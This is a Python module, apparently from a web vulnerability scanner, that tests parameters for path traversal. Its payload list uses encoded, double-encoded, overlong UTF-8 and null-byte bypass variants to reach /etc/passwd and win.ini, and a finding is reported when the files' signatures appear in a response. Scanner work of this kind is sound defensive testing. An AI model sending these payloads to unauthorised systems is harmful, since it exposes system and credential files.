from .common import finding, mutated


# Directory / path traversal across encodings and bypass styles. Each payload aims
# at a well-known file; detection is by that file's content signature appearing in
# the response but not the baseline. Grouped: simple, percent-encoded, double-encoded,
# overlong-UTF-8, and filter-bypass ("....//", trailing null, absolute path).
_UNIX_SIG = "root:x:0:0"
_WIN_SIG = "[fonts]"

PAYLOADS = (
    # --- simple ---
    ("../../../../../../etc/passwd", _UNIX_SIG),
    (r"..\..\..\..\..\..\windows\win.ini", _WIN_SIG),
    ("/etc/passwd", _UNIX_SIG),                                   # absolute path
    # --- percent-encoded ---
    ("..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", _UNIX_SIG),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", _UNIX_SIG),
    ("..%5c..%5c..%5c..%5cwindows%5cwin.ini", _WIN_SIG),
    # --- double / mixed encoded ---
    ("%252e%252e%252f%252e%252e%252fetc%252fpasswd", _UNIX_SIG),
    ("..%252f..%252f..%252fetc%252fpasswd", _UNIX_SIG),
    # --- overlong UTF-8 encoding of '.' and '/' ---
    ("%c0%ae%c0%ae%c0%afetc%c0%afpasswd", _UNIX_SIG),
    # --- filter-bypass tricks ---
    ("....//....//....//....//etc/passwd", _UNIX_SIG),            # stripped "../" -> "../"
    ("..././..././..././etc/passwd", _UNIX_SIG),
    ("../../../../etc/passwd%00", _UNIX_SIG),                     # trailing null byte
    ("../../../../etc/passwd%00.png", _UNIX_SIG),                 # null-byte extension bypass
)


def check(context, parameter):
    baseline = context.baseline.text.lower()
    for payload, signature in PAYLOADS:
        response = context.probe(mutated(context.params, parameter, payload), module="traversal")
        if (
            response is not None
            and signature.lower() not in baseline
            and signature.lower() in response.text.lower()
        ):
            return [finding(
                "Path Traversal", "high", context.endpoint, parameter, payload,
                f"File signature found: {signature}", response,
                evidence_payload="path traversal payload",
            )]
    return []
